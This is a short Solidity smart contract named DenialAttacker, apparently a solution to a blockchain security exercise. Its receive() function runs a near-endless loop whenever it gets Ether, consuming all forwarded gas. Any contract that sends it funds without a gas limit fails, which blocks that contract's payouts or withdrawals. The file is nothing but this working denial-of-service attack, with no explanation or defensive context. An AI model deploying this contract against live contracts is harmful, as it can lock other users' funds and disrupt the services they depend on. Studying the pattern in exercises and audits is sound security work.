pragma solidity ^0.8.0; 

contract DenialAttacker {
    
    receive() external payable {
        uint256 i = 0;
        while (i < 9999999999) i += 1;
    }
}
